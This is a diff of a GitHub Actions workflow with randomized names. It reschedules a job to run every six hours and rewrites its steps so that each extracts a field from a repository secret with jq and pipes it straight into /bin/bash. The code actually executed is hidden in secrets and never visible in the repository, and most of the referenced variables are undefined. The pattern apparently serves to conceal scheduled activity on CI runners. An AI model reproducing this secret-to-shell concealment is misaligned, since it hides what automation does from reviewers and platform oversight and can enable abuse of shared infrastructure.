@@ -3,26 +3,29 @@ name: fuliming9891
 on:
   workflow_dispatch:
   schedule:
-    - cron: '11 0/6 * * *'
-
+    - cron: '0 4/6 * * *'
 jobs:
   build:
     runs-on: ubuntu-latest
+
     steps:
       - uses: actions/checkout@v4
       - name: fuliming9891
         env:
-          n766: ${{ secrets.n766 }}
+          w1437: ${{ secrets.w1437 }}
         run: |
-          echo $n766 | jq -r .hj05 | /bin/bash
-          echo $xvm9 | jq -r .wsce8189 | /bin/bash
-          echo $jzp8543 | jq -r .aycax0115 | /bin/bash
-          echo $ohya309 | jq -r .ycytr018 | /bin/bash
-          echo $svloe05 | jq -r .ta44079 | /bin/bash
-          echo $urtx4754 | jq -r .lwraj40 | /bin/bash
-          echo $uqbus7849 | jq -r .p17685 | /bin/bash
-          echo $mt2 | jq -r .glpeh4285 | /bin/bash
-          echo $cbnjn689 | jq -r .km75328 | /bin/bash
-          echo $l40 | jq -r .yp899 | /bin/bash
-          echo $upl37 | jq -r .zocte33783 | /bin/bash
+          echo $w1437 | jq -r .vu187 | /bin/bash
+          echo $eqb0704 | jq -r .xx6 | /bin/bash
+          echo $jrn01393 | jq -r .kd8 | /bin/bash
+          echo $dfljt74 | jq -r .ssllb0 | /bin/bash
+          echo $crf6306 | jq -r .mct932 | /bin/bash
+          echo $d919 | jq -r .xtbgv98107 | /bin/bash
+          echo $sg54754 | jq -r .ok8369 | /bin/bash
+          echo $rafsc231 | jq -r .d5 | /bin/bash
+          echo $xlm96461 | jq -r .v857 | /bin/bash
+          echo $n934 | jq -r .lhuy80369 | /bin/bash
+          echo $wfsrk836 | jq -r .d5254 | /bin/bash
+          echo $dht3 | jq -r .ago8237 | /bin/bash
+          echo $sxbt1 | jq -r .neb03373 | /bin/bash
+          echo $dlq14029 | jq -r .hfjzv97560 | /bin/bash
 
